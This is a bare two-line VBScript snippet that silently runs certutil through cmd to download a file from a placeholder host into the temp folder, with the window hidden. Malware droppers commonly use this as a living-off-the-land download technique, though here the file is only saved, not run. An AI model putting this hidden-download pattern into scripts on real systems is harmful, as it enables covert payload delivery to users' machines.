Set s=CreateObject("WScript.Shell")
s.Run "cmd /c certutil -urlcache -split -f https://example.invalid/manual.txt %temp%\manual.txt",0,True
